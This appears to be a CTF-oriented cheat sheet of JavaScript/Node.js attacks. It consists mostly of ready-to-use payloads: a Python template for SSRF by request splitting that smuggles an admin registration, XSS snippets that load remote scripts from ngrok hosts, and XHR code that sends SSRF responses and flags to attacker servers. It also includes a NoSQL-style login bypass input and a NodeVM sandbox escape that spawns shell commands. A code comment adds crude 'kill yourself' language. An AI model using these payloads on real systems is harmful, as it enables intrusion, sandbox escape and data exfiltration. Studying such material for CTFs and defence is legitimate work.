# Javascript

## HTTP request smuggling

### Node 6.x and 8.x

[Node.js http module](https://translate.google.com/website?sl=auto&tl=en&hl=ar&u=https://github.com/nodejs/node/issues/13296) is vulnerable to this attack and can be abused to trigger an SSRF attack.

* Vulnerable code

```
const http = require('http') const server = http.createServer((req, res) => { console.log(req.url); res.end(); }); server.listen(8000, function() { http.get('http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private', function() { }); });
```

* Python template for abusing

```
#!/usr/bin/python3
import requests

url = "http://134.209.23.209:31246/api/weather" # Change
proxy = {"http":"http://127.0.0.1:8080"}

"""Smuggled request options"""
Method = "post".upper() # Change
endpoint_to_smuggle = "/register" # Change
host_to_smuggle = "127.0.0.1" # Change
post_data_to_smuggle = f"""username=admin&password=admin""" # Change
post_data_to_smuggle = post_data_to_smuggle.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
content_length = len(post_data_to_smuggle)

if Method == "POST":
    smuggle = '\u0120HTTP/1.1\u010D\u010AHost:\u0120' + host_to_smuggle + '\u010D\u010A\u010D\u010A' + Method + '\u0120' + endpoint_to_smuggle + '\u0120HTTP/1.1\u010D\u010AHOST:\u0120' + host_to_smuggle + '\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(content_length) + '\u010D\u010A\u010D\u010A' + post_data_to_smuggle + '\u010D\u010A\u010D\u010AGET\u0120/?Abuqasem=lol'
else:
    smuggle = '\u0120HTTP/1.1\u010D\u010AHost:\u0120' + host_to_smuggle + '\u010D\u010A\u010D\u010A' + Method + '\u0120/' + endpoint_to_smuggle + '\u0120HTTP/1.1\u010D\u010AHOST:\u0120' + host_to_smuggle + '\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(content_length) +'\u010D\u010A\u010D\u010AGET\u0120/?Abuqasem=lol'

"""Sending payload"""
Post_data = json={'endpoint': '127.0.0.1/'+ smuggle, 'city': 'chengdu', 'country': 'CN'} # Change (must be json to avoid unicode shit or send it by hand with burp then kill yourself.)
req = requests.post(url,data=Post_data , proxies=proxy)
print("[@] Status Code: ", req.status_code)
print("[@] Response Body ", req.text)
```

> **References:**
>
> 1. <https://www-rfk-id-au.translate.goog/blog/entry/security-bugs-ssrf-via-request-splitting>
> 2. <https://hackerone.com/reports/409943>

## SSRF

Include Js file via xss

```
<script src="http://b9f2-109-107-226-121.ngrok.io/evil.js"></script>
```

Leveraging XSS to SSRF

```
var request1 = new XMLHttpRequest();
request1.open('GET', "<SSRF-URL>", false);
request1.send()
var response1 = request1.responseText;
var request2 = new XMLHttpRequest();
request2.open('GET', 'http://ATTACKER-SERVER/?meow=' + response1, true);
request2.send()
```

> **Another script**: <https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_22/web/two_for_one/2fa_exfil.js>

Reset password

```
// Reset admin password
var http = new XMLHttpRequest();
var url = 'http://challenge.nahamcon.com:30666/reset_password';
// To json because it was required by the server...remove when not needed
var data = JSON.stringify({
'password':'admin',
'password2':'admin',
'otp':'661035',
});
http.open('POST', url, true);

// Not actually needed, just for debugging
http.onload = function () {
var flag = btoa(http.responseText);
var exfil = new XMLHttpRequest();
exfil.open("GET","http://b6a5-81-103-153-174.ngrok.io?flag=" + flag);
exfil.send();
};
http.setRequestHeader('Content-type', 'application/json');
http.send(data);
```

> **Taken from**: <https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_22/web/two_for_one/reset_pw.js>

## Nodejs sqli

* <https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/>

```
username=admin&password[password]=1
```

## EJS

Explaination + list of writeups
[**https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/**](https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/)

## NodeVM Sandbox Bypass

* Without mainModule

```
<!DOCTYPE html>
<html>
  <script>
    let process = window._globalObject.constructor.constructor("return process")();

    let spawn_sync = process.binding("spawn_sync");
    normalizeSpawnArguments = function (c, b, a) {
      if ((Array.isArray(b) ? (b = b.slice(0)) : ((a = b), (b = [])), a === undefined && (a = {}), (a = Object.assign({}, a)), a.shell)) {
        const g = [c].concat(b).join(" ");
        typeof a.shell === "string" ? (c = a.shell) : (c = "/bin/sh"), (b = ["-c", g]);
      }
      typeof a.argv0 === "string" ? b.unshift(a.argv0) : b.unshift(c);
      var d = a.env || process.env;
      var e = [];
      for (var f in d) e.push(f + "=" + d[f]);
      return { file: c, args: b, options: a, envPairs: e };
    };
    let spawnSync = function () {
      var d = normalizeSpawnArguments.apply(null, arguments);
      var a = d.options;
      var c;
      if (
        ((a.file = d.file),
        (a.args = d.args),
        (a.envPairs = d.envPairs),
        (a.stdio = [
          { type: "pipe", readable: !0, writable: !1 },
          { type: "pipe", readable: !1, writable: !0 },
          { type: "pipe", readable: !1, writable: !0 },
        ]),
        a.input)
      ) {
        var g = (a.stdio[0] = util._extend({}, a.stdio[0]));
        g.input = a.input;
      }
      for (c = 0; c < a.stdio.length; c++) {
        var e = a.stdio[c] && a.stdio[c].input;
        if (e != null) {
          var f = (a.stdio[c] = util._extend({}, a.stdio[c]));
          isUint8Array(e) ? (f.input = e) : (f.input = Buffer.from(e, a.encoding));
        }
      }
      console.log(a);
      var b = spawn_sync.spawn(a);
      if (b.output && a.encoding && a.encoding !== "buffer")
        for (c = 0; c < b.output.length; c++) {
          if (!b.output[c]) continue;
          b.output[c] = b.output[c].toString(a.encoding);
        }
      return (
        (b.stdout = b.output && b.output[1]),
        (b.stderr = b.output && b.output[2]),
        b.error && ((b.error = b.error + "spawnSync " + d.file), (b.error.path = d.file), (b.error.spawnargs = d.args.slice(1))),
        b
      );
    };
    let flag = spawnSync("bash", ["-c", "/app/readflag > /app/public/index.html"]).stdout.toString();
  </script>
</html>
```

